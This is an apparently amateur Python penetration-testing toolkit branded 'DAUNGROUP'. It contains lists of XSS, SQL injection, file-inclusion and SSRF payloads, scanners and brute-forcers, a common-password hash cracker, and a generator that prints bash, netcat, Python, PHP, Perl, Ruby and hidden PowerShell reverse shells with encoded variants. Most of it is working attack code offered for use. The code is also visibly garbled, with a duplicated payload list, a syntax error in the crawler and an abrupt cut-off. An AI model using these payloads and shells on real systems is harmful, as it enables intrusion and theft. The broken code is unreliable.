#!/usr/bin/env python3
"""
██████╗  █████╗ ██╗   ██╗███╗   ██╗ ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗ 
██╔══██╗██╔══██╗██║   ██║████╗  ██║██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗
██║  ██║███████║██║   ██║██╔██╗ ██║██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝
██║  ██║██╔══██║██║   ██║██║╚██╗██║██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝
██████╔╝██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║     
╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     
                                                                                
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃  🔥 ADVANCED PENETRATION TESTING FRAMEWORK 🔥           ┃
        ┃  👑 DAUNGROUP - Elite Security Research Team 👑         ┃
        ┃  Version: 2.0 AGGRESSIVE | Build: ULTIMATE              ┃
        ┃  ⚠️  FOR AUTHORIZED TARGETS ONLY - USE RESPONSIBLY ⚠️   ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""

import socket
import requests
import threading
import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import ssl
from urllib.parse import urlparse, urljoin, quote, parse_qs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import subprocess
import itertools

try:
    import dns.resolver
except ImportError:
    print("[!] Installing dnspython...")
    os.system("pip3 install dnspython --quiet")
    import dns.resolver

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Color codes
class C:
    H = '\033[95m'; B = '\033[94m'; C = '\033[96m'; G = '\033[92m'
    W = '\033[93m'; F = '\033[91m'; E = '\033[0m'; BOLD = '\033[1m'
    BLINK = '\033[5m'; UNDER = '\033[4m'

# User agents for stealth
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
]

# Advanced XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS-DAUNGROUP')</script>",
    "<img src=x onerror=alert('DAUNGROUP')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "javascript:alert('XSS')",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<form><button formaction=javascript:alert('XSS')>CLICK</button></form>",
    "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>"
]",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "javascript:alert('XSS')",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<form><button formaction=javascript:alert('XSS')>",
    "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>"
]

# Advanced SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username, password FROM users--",
    "' AND 1=0 UNION ALL SELECT 'admin', 'pass'",
    "' AND 1=0 UNION ALL SELECT NULL, table_name FROM information_schema.tables",
    "1' AND '1'='2' UNION SELECT NULL, NULL--",
    "' waitfor delay '0:0:5'--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
]

# LFI/RFI payloads
LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....\/....\/....\/etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\boot.ini"
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://2130706433",
    "http://0177.0.0.1",
    "http://localhost:22",
    "http://localhost:3306",
    "file:///etc/passwd",
    "dict://localhost:11211/stats",
    "gopher://localhost:6379/_INFO"
]

# Open Redirect payloads
REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "//google.com",
    "javascript:alert('XSS')",
    "\\/\\/evil.com",
    "//evil%E3%80%82com",
    "////evil.com",
    "/\\evil.com"
]

# Common directories
DIRECTORIES = [
    "admin", "login", "dashboard", "panel", "cpanel", "wp-admin", "administrator",
    "phpmyadmin", "pma", "mysql", "sql", "database", "db", "backup", "backups",
    "old", "new", "test", "demo", "dev", "staging", "prod", "api", "v1", "v2",
    "upload", "uploads", "files", "documents", "images", "img", "assets", "static",
    "config", "configuration", "settings", "include", "includes", "lib", "libs",
    "temp", "tmp", "cache", "log", "logs", "debug", "error", "errors",
    ".git", ".svn", ".env", ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml",
    "web.config", "phpinfo.php", "info.php", "test.php", "shell.php",
    "adminer.php", "setup.php", "install.php", "readme.html", "license.txt"
]

# Port service names
PORT_SERVICES = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
    110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB", 3306: "MySQL",
    3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-ALT",
    8443: "HTTPS-ALT", 27017: "MongoDB", 9200: "Elasticsearch", 11211: "Memcached"
}

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{C.C}{__doc__}{C.E}")

def ps(msg): print(f"{C.G}[+] {msg}{C.E}")
def pi(msg): print(f"{C.B}[*] {msg}{C.E}")
def pw(msg): print(f"{C.W}[!] {msg}{C.E}")
def pe(msg): print(f"{C.F}[-] {msg}{C.E}")
def ph(msg): print(f"{C.H}[#] {msg}{C.E}")

def get_random_ua():
    return random.choice(USER_AGENTS)

def create_session():
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua()})
    return session

# ==================== ADVANCED SUBDOMAIN ENUMERATION ====================
def subdomain_enum_advanced(domain):
    pi(f"Starting AGGRESSIVE subdomain enumeration for {domain}")
    
    subdomains = [
        "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "ns3", "ns4",
        "admin", "administrator", "webadmin", "sysadmin", "netadmin", "portal",
        "blog", "forum", "shop", "store", "api", "mobile", "m", "app",
        "dev", "development", "test", "testing", "stage", "staging", "prod", "production",
        "demo", "sandbox", "secure", "vpn", "remote", "cloud", "cdn", "assets",
        "static", "media", "images", "img", "video", "download", "downloads",
        "support", "help", "helpdesk", "ticket", "tickets", "chat",
        "email", "imap", "pop3", "exchange", "owa", "autodiscover",
        "cpanel", "whm", "panel", "control", "manage", "dashboard",
        "beta", "alpha", "old", "new", "legacy", "v1", "v2", "backup"
    ]
    
    found = []
    
    def check_subdomain(sub):
        subdomain = f"{sub}.{domain}"
        try:
            result = socket.gethostbyname(subdomain)
            ps(f"Found: {subdomain} [{result}]")
            return {"subdomain": subdomain, "ip": result}
        except:
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(check_subdomain, sub) for sub in subdomains]
        for future in as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
    
    # DNS Zone Transfer attempt
    try:
        pi("Attempting DNS Zone Transfer...")
        ns_records = dns.resolver.resolve(domain, 'NS')
        for ns in ns_records:
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(str(ns), domain))
                ps(f"Zone Transfer SUCCESSFUL on {ns}!")
                for name in zone.nodes.keys():
                    ps(f"  Found: {name}.{domain}")
            except:
                pass
    except:
        pass
    
    return found

# ==================== AGGRESSIVE PORT SCANNER ====================
def port_scan_aggressive(target, port_range="1-1000"):
    pi(f"Starting AGGRESSIVE port scan on {target}")
    
    start_port, end_port = map(int, port_range.split('-'))
    open_ports = []
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            sock.close()
            if result == 0:
                service = PORT_SERVICES.get(port, "Unknown")
                return {"port": port, "service": service}
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, port) for port in range(start_port, end_port + 1)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                ps(f"Port {result['port']}/tcp OPEN - {result['service']}")
                open_ports.append(result)
    
    # Service detection
    for port_info in open_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port_info['port']))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            if banner:
                ph(f"  Banner [{port_info['port']}]: {banner[:100]}")
        except:
            pass
    
    return open_ports

# ==================== ADVANCED DIRECTORY BRUTEFORCE ====================
def dir_bruteforce_advanced(url):
    pi(f"Starting AGGRESSIVE directory bruteforce on {url}")
    session = create_session()
    found = []
    
    def check_dir(dir_path):
        test_url = urljoin(url, dir_path)
        try:
            resp = session.get(test_url, timeout=3, allow_redirects=False, verify=False)
            if resp.status_code in [200, 301, 302, 401, 403]:
                size = len(resp.content)
                return {"url": test_url, "status": resp.status_code, "size": size}
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(check_dir, d) for d in DIRECTORIES]
        for future in as_completed(futures):
            result = future.result()
            if result:
                status_color = C.G if result['status'] == 200 else C.W if result['status'] in [401, 403] else C.C
                print(f"{status_color}[{result['status']}] {result['url']} ({result['size']} bytes){C.E}")
                found.append(result)
    
    return found

# ==================== ADVANCED WAF DETECTION ====================
def detect_waf_advanced(url):
    pi(f"Detecting WAF/Security solutions on {url}")
    session = create_session()
    
    waf_signatures = {
        "Cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
        "AWS WAF": ["x-amzn-requestid", "x-amz-"],
        "Akamai": ["akamai", "akamaighost"],
        "Sucuri": ["sucuri", "x-sucuri"],
        "Incapsula": ["incapsula", "x-cdn", "visid_incap"],
        "ModSecurity": ["mod_security", "modsecurity"],
        "Wordfence": ["wordfence"],
        "F5 BIG-IP": ["bigip", "f5"],
        "Barracuda": ["barracuda"],
        "Fortinet": ["fortigate", "fortiweb"]
    }
    
    try:
        # Normal request
        resp1 = session.get(url, timeout=5, verify=False)
        
        # Malicious request
        resp2 = session.get(url + "?id='<script>alert(1)</script>", timeout=5, verify=False)
        
        headers = {k.lower(): v.lower() for k, v in {**resp1.headers, **resp2.headers}.items()}
        
        detected = []
        for waf, sigs in waf_signatures.items():
            for sig in sigs:
                if any(sig in h or sig in v for h, v in headers.items()):
                    detected.append(waf)
                    break
        
        if detected:
            pw(f"WAF Detected: {', '.join(set(detected))}")
        else:
            ps("No WAF detected - Target looks vulnerable!")
        
        # Check for rate limiting
        pi("Testing rate limiting...")
        for i in range(5):
            r = session.get(url, timeout=2, verify=False)
            if r.status_code == 429:
                pw("Rate limiting detected!")
                break
        
        return detected
    except Exception as e:
        pe(f"Error: {e}")
        return []

# ==================== ADVANCED XSS SCANNER ====================
def xss_scan_advanced(url, params=None):
    pi(f"Starting ADVANCED XSS scan on {url}")
    session = create_session()
    vulnerable = []
    
    if not params:
        pw("No parameters specified, attempting parameter discovery...")
        try:
            resp = session.get(url, verify=False)
            params = list(parse_qs(urlparse(url).query).keys())
            if not params:
                params = re.findall(r'name=["\']([^"\']+)["\']', resp.text)
            pi(f"Found parameters: {params}")
        except:
            params = []
    
    if not params:
        pw("No parameters found for testing")
        return vulnerable
    
    for param in params:
        for payload in XSS_PAYLOADS:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = session.get(test_url, timeout=5, verify=False)
                
                # Check if payload is reflected
                if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                    ps(f"XSS FOUND! Param: {param} | Payload: {payload[:50]}")
                    vulnerable.append({"param": param, "payload": payload, "url": test_url})
                    break  # Move to next param
            except:
                pass
    
    return vulnerable

# ==================== ADVANCED SQLI SCANNER ====================
def sqli_scan_advanced(url, params=None):
    pi(f"Starting ADVANCED SQL injection scan on {url}")
    session = create_session()
    vulnerable = []
    
    if not params:
        try:
            params = list(parse_qs(urlparse(url).query).keys())
            if not params:
                params = ['id', 'page', 'cat', 'user', 'search']
        except:
            params = ['id']
    
    sql_errors = [
        r"sql syntax", r"mysql", r"sqlserver", r"postgresql", r"oracle",
        r"syntax error", r"database error", r"warning: mysql", r"valid mysql result",
        r"unclosed quotation", r"quoted string not properly terminated",
        r"microsoft ole db provider", r"odbc sql server driver"
    ]
    
    for param in params:
        baseline = None
        try:
            baseline = session.get(url, timeout=5, verify=False)
        except:
            continue
        
        for payload in SQLI_PAYLOADS:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = session.get(test_url, timeout=5, verify=False)
                
                # Check for SQL errors
                for error_pattern in sql_errors:
                    if re.search(error_pattern, resp.text, re.IGNORECASE):
                        ps(f"SQLi FOUND! Param: {param} | Payload: {payload[:50]}")
                        vulnerable.append({"param": param, "payload": payload, "type": "error-based"})
                        break
                
                # Time-based detection
                if "waitfor" in payload.lower() or "sleep" in payload.lower():
                    start = time.time()
                    session.get(test_url, timeout=10, verify=False)
                    elapsed = time.time() - start
                    if elapsed > 5:
                        ps(f"SQLi FOUND (Time-based)! Param: {param}")
                        vulnerable.append({"param": param, "payload": payload, "type": "time-based"})
                
            except:
                pass
    
    return vulnerable

# ==================== LFI/RFI SCANNER ====================
def lfi_scan(url, params=None):
    pi(f"Starting LFI/RFI scan on {url}")
    session = create_session()
    vulnerable = []
    
    if not params:
        params = ['file', 'page', 'include', 'path', 'doc', 'document']
    
    for param in params:
        for payload in LFI_PAYLOADS:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = session.get(test_url, timeout=5, verify=False)
                
                # Check for file content indicators
                if "root:" in resp.text or "[boot loader]" in resp.text:
                    ps(f"LFI FOUND! Param: {param} | Payload: {payload}")
                    vulnerable.append({"param": param, "payload": payload})
                    break
            except:
                pass
    
    return vulnerable

# ==================== SSRF SCANNER ====================
def ssrf_scan(url, params=None):
    pi(f"Starting SSRF scan on {url}")
    session = create_session()
    vulnerable = []
    
    if not params:
        params = ['url', 'link', 'redirect', 'uri', 'path', 'callback']
    
    for param in params:
        for payload in SSRF_PAYLOADS:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = session.get(test_url, timeout=5, verify=False)
                
                # Check for AWS metadata
                if "ami-id" in resp.text or "instance-id" in resp.text:
                    ps(f"SSRF FOUND (AWS Metadata)! Param: {param}")
                    vulnerable.append({"param": param, "payload": payload})
                    break
                
                # Check for local file access
                if "root:" in resp.text:
                    ps(f"SSRF FOUND (File read)! Param: {param}")
                    vulnerable.append({"param": param, "payload": payload})
                    break
            except:
                pass
    
    return vulnerable

# ==================== OPEN REDIRECT SCANNER ====================
def redirect_scan(url, params=None):
    pi(f"Starting Open Redirect scan on {url}")
    session = create_session()
    vulnerable = []
    
    if not params:
        params = ['url', 'redirect', 'return', 'next', 'redir', 'dest', 'destination']
    
    for param in params:
        for payload in REDIRECT_PAYLOADS:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = session.get(test_url, timeout=5, allow_redirects=False, verify=False)
                
                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get('Location', '')
                    if 'evil.com' in location or 'google.com' in location:
                        ps(f"Open Redirect FOUND! Param: {param} | Redirect to: {location}")
                        vulnerable.append({"param": param, "redirect": location})
                        break
            except:
                pass
    
    return vulnerable

# ==================== SECURITY HEADERS ANALYZER ====================
def analyze_headers_advanced(url):
    pi(f"Analyzing security headers for {url}")
    session = create_session()
    
    security_headers = {
        "Strict-Transport-Security": "HSTS",
        "Content-Security-Policy": "CSP",
        "X-Frame-Options": "Clickjacking Protection",
        "X-Content-Type-Options": "MIME Sniffing Protection",
        "X-XSS-Protection": "XSS Protection",
        "Referrer-Policy": "Referrer Policy",
        "Permissions-Policy": "Permissions Policy",
        "Cross-Origin-Embedder-Policy": "COEP",
        "Cross-Origin-Opener-Policy": "COOP",
        "Cross-Origin-Resource-Policy": "CORP"
    }
    
    try:
        resp = session.get(url, timeout=5, verify=False)
        headers = resp.headers
        
        score = 0
        total = len(security_headers)
        
        pi("Security Headers Status:")
        for header, desc in security_headers.items():
            if header in headers:
                ps(f"✓ {desc} ({header}): {headers[header][:50]}")
                score += 1
            else:
                pe(f"✗ {desc} ({header}): MISSING")
        
        # Security score
        percentage = (score / total) * 100
        if percentage >= 80:
            ps(f"Security Score: {percentage:.1f}% - EXCELLENT")
        elif percentage >= 60:
            pw(f"Security Score: {percentage:.1f}% - GOOD")
        elif percentage >= 40:
            pw(f"Security Score: {percentage:.1f}% - MODERATE")
        else:
            pe(f"Security Score: {percentage:.1f}% - POOR")
        
        # Check for information disclosure
        pi("Checking for information disclosure...")
        info_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
        for h in info_headers:
            if h in headers:
                pw(f"Information disclosure: {h}: {headers[h]}")
        
        return dict(headers)
    except Exception as e:
        pe(f"Error: {e}")
        return {}

# ==================== TECHNOLOGY DETECTION ====================
def detect_technologies(url):
    pi(f"Detecting technologies on {url}")
    session = create_session()
    
    try:
        resp = session.get(url, timeout=5, verify=False)
        headers = resp.headers
        content = resp.text
        
        techs = []
        
        # Server
        if 'Server' in headers:
            ps(f"Server: {headers['Server']}")
            techs.append(headers['Server'])
        
        # Programming languages
        if 'X-Powered-By' in headers:
            ps(f"Powered By: {headers['X-Powered-By']}")
            techs.append(headers['X-Powered-By'])
        
        # CMS Detection
        cms_patterns = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-json'],
            'Joomla': ['/components/', '/modules/', 'joomla'],
            'Drupal': ['/sites/default/', 'drupal'],
            'Magento': ['/skin/frontend/', 'mage'],
            'PrestaShop': ['/themes/', 'prestashop']
        }
        
        for cms, patterns in cms_patterns.items():
            if any(p in content for p in patterns):
                ps(f"CMS Detected: {cms}")
                techs.append(cms)
        
        # JavaScript frameworks
        js_frameworks = {
            'React': ['react', '__REACT'],
            'Vue.js': ['vue', '__VUE__'],
            'Angular': ['ng-', 'angular'],
            'jQuery': ['jquery']
        }
        
        for framework, patterns in js_frameworks.items():
            if any(p in content.lower() for p in patterns):
                ps(f"JS Framework: {framework}")
                techs.append(framework)
        
        return techs
    except Exception as e:
        pe(f"Error: {e}")
        return []

# ==================== CRAWLER/SPIDER ====================
def crawl_website(url, max_pages=50):
    pi(f"Starting web crawler on {url} (max {max_pages} pages)")
    session = create_session()
    
    visited = set()
    to_visit = {url}
    found_urls = []
    
    base_domain = urlparse(url).netloc
    
    while to_visit and len(visited) < max_pages:
        current_url = to_visit.pop()
        
        if current_url in visited:
            continue
        
        try:
            resp = session.get(current_url, timeout=5, verify=False)False)
            visited.add(current_url)
            found_urls.append(current_url)
            
            pi(f"Crawling: {current_url}")
            
            # Find all links
            links = re.findall(r'href=["\'](.*?)["\']', resp.text)
            
            for link in links:
                full_url = urljoin(current_url, link)
                parsed = urlparse(full_url)
                
                # Only crawl same domain
                if parsed.netloc == base_domain and full_url not in visited:
                    to_visit.add(full_url)
        
        except:
            pass
    
    ps(f"Crawling complete! Found {len(found_urls)} pages")
    return found_urls

# ==================== NMAP INTEGRATION ====================
def nmap_scan(target, scan_type="aggressive"):
    pi(f"Starting Nmap {scan_type} scan on {target}")
    
    nmap_commands = {
        "quick": f"nmap -F {target}",
        "aggressive": f"nmap -A -T4 {target}",
        "stealth": f"nmap -sS -T2 {target}",
        "vuln": f"nmap --script vuln {target}",
        "full": f"nmap -p- -A -T4 {target}"
    }
    
    cmd = nmap_commands.get(scan_type, nmap_commands["aggressive"])
    
    try:
        pi(f"Running: {cmd}")
        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=300)
        print(result.stdout)
        return result.stdout
    except FileNotFoundError:
        pw("Nmap not installed! Install with: sudo apt install nmap")
        return None
    except subprocess.TimeoutExpired:
        pw("Nmap scan timeout!")
        return None
    except Exception as e:
        pe(f"Error: {e}")
        return None

# ==================== NIKTO SCANNER ====================
def nikto_scan(url):
    pi(f"Starting Nikto web scanner on {url}")
    
    try:
        cmd = f"nikto -h {url} -C all"
        pi(f"Running: {cmd}")
        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=600)
        print(result.stdout)
        return result.stdout
    except FileNotFoundError:
        pw("Nikto not installed! Install with: sudo apt install nikto")
        return None
    except Exception as e:
        pe(f"Error: {e}")
        return None

# ==================== SQLMAP INTEGRATION ====================
def sqlmap_scan(url, param=None):
    pi(f"Starting SQLMap scan on {url}")
    
    if param:
        cmd = f"sqlmap -u {url} -p {param} --batch --level=5 --risk=3"
    else:
        cmd = f"sqlmap -u {url} --batch --crawl=3 --level=5 --risk=3"
    
    try:
        pi(f"Running: {cmd}")
        pw("This may take several minutes...")
        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=900)
        print(result.stdout)
        return result.stdout
    except FileNotFoundError:
        pw("SQLMap not installed! Install with: sudo apt install sqlmap")
        return None
    except Exception as e:
        pe(f"Error: {e}")
        return None

# ==================== HASH CRACKER ====================
def crack_hash(hash_value, hash_type="auto"):
    pi(f"Attempting to crack hash: {hash_value}")
    
    # Common hash patterns
    hash_types = {
        32: "MD5",
        40: "SHA1",
        64: "SHA256",
        128: "SHA512"
    }
    
    if hash_type == "auto":
        hash_type = hash_types.get(len(hash_value), "Unknown")
        pi(f"Detected hash type: {hash_type}")
    
    # Try common passwords
    common_passwords = [
        "password", "123456", "12345678", "admin", "root", "toor",
        "qwerty", "abc123", "password123", "admin123", "letmein",
        "welcome", "monkey", "dragon", "master", "sunshine"
    ]
    
    for pwd in common_passwords:
        # Try different hash types
        hashes = {
            "MD5": hashlib.md5(pwd.encode()).hexdigest(),
            "SHA1": hashlib.sha1(pwd.encode()).hexdigest(),
            "SHA256": hashlib.sha256(pwd.encode()).hexdigest(),
            "SHA512": hashlib.sha512(pwd.encode()).hexdigest()
        }
        
        if hash_value.lower() in [h.lower() for h in hashes.values()]:
            ps(f"HASH CRACKED! Password: {pwd}")
            return pwd
    
    pw("Hash not cracked with common passwords. Try using hashcat or john")
    return None

# ==================== JWT TOKEN DECODER ====================
def jwt_decode(token):
    pi("Decoding JWT token...")
    
    try:
        parts = token.split('.')
        if len(parts) != 3:
            pe("Invalid JWT format")
            return None
        
        # Decode header
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        ps(f"Header: {json.dumps(header, indent=2)}")
        
        # Decode payload
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        ps(f"Payload: {json.dumps(payload, indent=2)}")
        
        # Check for weak algorithms
        if header.get('alg') == 'none':
            pw("CRITICAL: Algorithm is 'none' - token is not signed!")
        elif header.get('alg') in ['HS256', 'HS384', 'HS512']:
            pw("Algorithm uses HMAC - vulnerable to key brute-force")
        
        return {"header": header, "payload": payload}
    except Exception as e:
        pe(f"Error decoding JWT: {e}")
        return None

# ==================== REVERSE SHELL GENERATOR ====================
def generate_reverse_shell(ip, port, shell_type="bash"):
    pi(f"Generating {shell_type} reverse shell for {ip}:{port}")
    
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "nc": f"nc -e /bin/bash {ip} {port}",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    }
    
    if shell_type in shells:
        print(f"\n{C.G}[PAYLOAD]{C.E}")
        print(f"{C.C}{shells[shell_type]}{C.E}\n")
        
        # URL encoded version
        encoded = quote(shells[shell_type])
        print(f"{C.G}[URL ENCODED]{C.E}")
        print(f"{C.C}{encoded}{C.E}\n")
        
        # Base64 encoded
        b64 = base64.b64encode(shells[shell_type].encode()).decode()
        print(f"{C.G}[BASE64 ENCODED]{C.E}")
        print(f"{C.C}{b64}{C.E}\n")
        
        pw(f"Start listener with: nc -lvnp {port}")
        
        return shells[shell_type]
    else:
        pe(f"Unknown shell type. Available: {', '.join(shells.keys())}")
        return None

# ==================== PAYLOAD ENCODER ====================
def encode_payload(payload, encoding_type="all"):
    pi(f"Encoding payload with {encoding_type}")
    
    encodings = {}
    
    # URL encoding
    encodings['url'] = quote(payload)
    
    # Double URL encoding
    encodings['double_url'] = quote(quote(payload))
    
    # Base64
    encodings['base64'] = base64.b64encode(payload.encode()).decode()
    
    # Hex
    encodings['hex'] = payload.encode().hex()
    
    # HTML entities
    encodings['html'] = ''.join([f'&#{ord(c)};' for c in payload])
    
    # Unicode
    encodings['unicode'] = ''.join([f'\\u{ord(c):04x}' for c in payload])
    
    if encoding_type == "all":
        for enc_type, encoded in encodings.items():
            print(f"\n{C.G}[{enc_type.upper()}]{C.E}")
            print(f"{C.C}{encoded}{C.E}")
        return encodings
    elif encoding_type in encodings:
        print(f"\n{C.G}[{encoding_type.upper()}]{C.E}")
        print(f"{C.C}{encodings[encoding_type]}{C.E}")
        return encodings[encoding_type]
    else:
        pe(f"Unknown encoding type. Available: {', '.join(encodings.keys())}")
        return None

# ==================== API FUZZER ====================
def api_fuzzer(url, method="GET", wordlist=None):
    pi(f"Starting API fuzzing on {url}")
    session = create_session()
    
    # Common API endpoints
    api_endpoints = [
        "api/v1/users", "api/v2/users", "api/users", "api/login", "api/auth",
        "api/admin", "api/config", "api/settings", "api/upload", "api/download",
        "api/files", "api/data", "api/export", "api/import", "api/backup",
        "api/version", "api/status", "api/health", "api/metrics", "api/logs",
        "graphql", "graphiql", "swagger", "api-docs", "docs", "v1", "v2", "v3"
    ]
    
    endpoints = wordlist if wordlist else api_endpoints
    found = []
    
    for endpoint in endpoints:
        test_url = urljoin(url, endpoint)
        try:
            if method == "GET":
                resp = session.get(test_url, timeout=3, verify=False)
            elif method == "POST":
                resp = session.post(test_url, timeout=3, verify=False)
            else:
                resp = session.request(method, test_url, timeout=3, verify=False)
            
            if resp.status_code in [200, 201, 301, 302, 401, 403]:
                status_color = C.G if resp.status_code in [200, 201] else C.W
